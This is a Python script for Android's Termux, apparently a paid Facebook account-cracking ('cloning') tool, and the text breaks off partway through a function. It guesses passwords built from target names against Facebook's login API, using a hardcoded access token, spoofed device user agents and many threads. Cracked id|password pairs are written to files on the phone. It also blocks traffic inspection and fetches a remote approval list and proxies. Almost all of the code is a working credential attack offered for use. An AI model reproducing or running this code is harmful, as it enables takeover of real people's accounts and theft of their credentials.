#=MAHDI=@
#----------------------------------------------------------------#
import os
#----------------------------------------------#
os.system('clear')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('loading Modules ...\n')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python jihad.py')
#--------------------------proxies---------------------------#
king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(king+'sessions.py','r').read():
    pass
else:
    exit('\033[1;32mDONT TRY TO CAPTURE')
qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(qeen+'models.py','r').read():
    pass
else:
    exit('\033[1;32mDONT TRY TO CAPTURE')
don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(don+'utils.py','r').read():
    pass
else:
    exit('\033[1;32mDONT TRY TO CAPTURE')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(prox)
except Exception as e:
	print('')
proxies=open('proxies.txt','r').read().splitlines()

princp=[]
#-----------------------------------------------------#
usr=[]
android_models=[]
#-----------------------------------------------------#
bXTM="\033[1;30m" 
M="\033[1;31m"       
H="\033[1;33m"               
byellow="\033[1;33m"     
bblue="\033[1;34m"        
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
G="\033[1;32m"              
R="\033[1;31m"
AA="\033[1;32m"
BB="\033[1;31m"
CC="\033[1;36m"
X='\033[1;30m'
XX="\x1b[38;5;196m"
GGG="\x1b[38;5;214m"
#-----------------------------------------------------#

  

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#-----------------------------------------------------#
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def morshed1():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        return ua
#-----------------------------------------------------#
vers = requests.get('https://raw.githubusercontent.com/MORSHED-404/MORSHED-404/main/version.txt').text
version = str(vers)
#-------------------------------#
#os.system('xdg-open https://www.facebook.com/profile.php?id=100078455010053')
logo = (f"""
  \x1b[38;5;46m███    ███  █████  ██   ██ ██████  ██ 
  \x1b[38;5;47m████  ████ ██   ██ ██   ██ ██   ██ ██ 
  \x1b[38;5;48m██ ████ ██ ███████ ███████ ██   ██ ██ 
  \x1b[38;5;49m██  ██  ██ ██   ██ ██   ██ ██   ██ ██ 
  \x1b[38;5;50m██      ██ ██   ██ ██   ██ ██████  ██ \033[1;32m XTM
{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR    : MAHDI             
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mFACEBOOK  : MAHDI            
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;48mGITHUB    : MAHDI-3329             {version}{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
dc = random.choice([A,B,C,D,M,H,N,E,F,G,P])
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]


try:
    os.system('clear')
    xnx = requests.get('https://github.com/Nur-3329/APPROVAL.txt/blob/main/Approved.txt').text
    if "maintenance" in xnx:
        os.system('clear')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m MAINTENANCE BREAK RUNNING\n')
        sys.exit()
    if "OxFF" in xnx:
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m TOOL IS OFF NOW ')
        sys.exit()
    if "update" in xnx:
        for up in range(999):
            print(f"\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m WAIT YOUR NEXT UPDATE ")
            time.sleep(0.8)
    if "server" in xnx:
        print(f' {warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}SERVER IS OFF')
        sys.exit()
except requests.exceptions.ConnectionError:
    print(f" {warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}FIX YOUR INTERNET BRUH")
    sys.exit()

def menu():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid())
  id = "".join(uuid)

  try:
    httpCaht = requests.get('https://github.com/Nur-3329/APPROVAL.txt/blob/main/Approved.txt').text    
    if id in httpCaht:
      print(f"\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m APPROVED SUCCESSFUL")
      msg = str(os.geteuid())
      time.sleep(4.9)
      menu_a()
      pass
    else:
      print(f'{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}YOUR KEY  : =['+id+']=')
      linex()
      print(f"{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}NOTE !")
      print(f"{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}THIS IS PAID TOOL [💸]")
      print(f"{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}SEND YOUR KEY ADMIN [💸]")
      linex()
      input(f'{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+8801305703329?text='+tks),approval()
      time.sleep(9)
      approval()
  except:
    sys.exit()
    
#---------------------------------------------------
def menu_a():
			clear()
			os.system('xdg-open https://www.facebook.com/profile.php?id=100078455010053')
			linex()
			print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m FILE CLONING')
			print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;47m RANDOM CLONING ')
			print(f"\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;48m CONTACT TOOLS ADMIN ")
			print(f'\x1b[1;92m {XX}[\x1b[1;92m4{XX}]\x1b[38;5;49m CONTACT WHATSAPP ')			
			print(f'\x1b[1;92m {XX}[\x1b[1;92m0{XX}]\x1b[38;5;51m EXIT MENU ')
			linex()
			xd=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m CHOICE MENU : ')
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FILE NAME : /sdcard/XTM.txt  etc..')
				linex()
				file = input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m PUT FILE NAME : ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46mFILE LOCATION NOT FOUND ')
					time.sleep(1)
					menu()
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mA{XX}]')
				print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mB{XX}]')
				linex()
				mthd=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SELECT METHOD : ')
				linex()
				plist = []
				clear()
				try:
					ps_limit = int(input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m How many password do you want to add : '))
				except:
					ps_limit =1
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXP : first last:,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m Password {i+1} : '))
					linex()
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m Do You Went Show Cp Account? {R}[{G}y{R}|{H}n{R}] ')
				linex()
				cx=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m CHOICE MENU : ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m TOTAL IDS : '+total_ids+f' ')
					print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m USE APN FOR MORE OK IDZ {N}>> {G}M{mthd}')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','A']:
							crack_submit.submit(api1,ids,names,passlist)
						if mthd in ['B','2']:
							crack_submit.submit(api2,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(f'\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] THE PROCESS HAS COMPLETED')
				print(f'\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46mPRESS ENTER TO BACK ')
				os.system('python jihad.py')
			elif xd in ['2','02']:
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/profile.php?id=100078455010053');menu()
			elif xd in ['4','04']:os.system('xdg-open https://wa.me/+8801305703329');menu()
			elif xd in ['5','05']:os.system('xdg-open https://www.facebook.com/profile.php?id=100078455010053');menu()
			elif xd in ['0','00']:clear();print(f"\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m THANKS FOR USING DEAR")
			
			

def RANDOM():
			clear()
			print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mBD{XX}]')
			print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mINDIA{XX}]')
			linex()
			NB=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m CHOICE MENU : ')
			if NB in ['1','01']:RANDOMBD()
			if NB in ['2','02']:RANDOMIN()
				
#-----------------------------------------------------#
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bXTM}[{G}XTM-M2{bXTM}]-[{G}%s{bXTM}]-[{G}OK:%s{bXTM}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        user_agento = f"Dalvik/2.1.0 Linux; U; Android "+str(random.randrange(5,14))+"; "+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+" Build/QP1A."+str(random.randrange(111111,999999))+") [FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["Xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':morshed1(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r {bXTM}[{G}XTM-OK{bXTM}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/XTM-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[XTM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[XTM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XTM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/XTM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#——————————————————————————————#
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bXTM}[{G}XTM-M1{bXTM}]-[{G}%s{bXTM}]-[{G}OK:%s{bXTM}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        user_agento = f"Dalvik/2.1.0 Linux; U; Android "+str(random.randrange(5,14))+"; "+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+" Build/QP1A."+str(random.randrange(111111,999999))+") [FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["Xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':morshed1(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://graph.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r {bXTM}[{G}XTM-OK{bXTM}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/XTM-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[XTM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[XTM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XTM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
